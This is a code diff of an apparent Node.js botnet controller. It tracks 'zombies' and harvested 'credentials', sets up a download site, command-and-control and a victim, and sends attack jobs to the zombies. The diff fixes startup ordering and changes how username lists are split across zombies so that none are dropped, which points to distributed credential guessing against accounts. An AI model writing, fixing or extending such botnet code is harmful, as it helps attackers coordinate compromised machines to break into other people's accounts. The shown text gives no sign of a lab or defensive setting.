@@ -11,11 +11,7 @@ const axios = require("axios");
 let zombies = [];
 let credentials = [];
 
-(async function() {
-    await initDownloadSite();
-    await initCommandAndControl();
-    await initVictim();
-})();
+
 
 const initDownloadSite = async() => {
     const port = await getPort({ port: 8000 }); //find an availble port (default 8000)
@@ -162,7 +158,7 @@ const sendAttackToZombies = (data) => {
         usernamesPerZombie = 1;
     }
 
-    zombies.forEach((zombie) => {
+    zombies.forEach((zombie, i) => {
         let usernameCount = 0;
         let zombieUsernames = [];
         //create array of usernames for this zombie to use
@@ -170,6 +166,12 @@ const sendAttackToZombies = (data) => {
             zombieUsernames.push(usernames.pop());
             usernameCount += 1;
         }
+        if (i === zombies.length - 1 && usernames.length > 0) {
+            while (usernames.length > 0) {
+                zombieUsernames.push(usernames.pop());
+            }
+        }
+
         //only send the request if there are usernames
         if (zombieUsernames.length > 0) {
             const data = {
@@ -195,3 +197,9 @@ const sendAttackToZombies = (data) => {
         }
     });
 };
+
+(async function() {
+    await initDownloadSite();
+    await initCommandAndControl();
+    await initVictim();
+})();
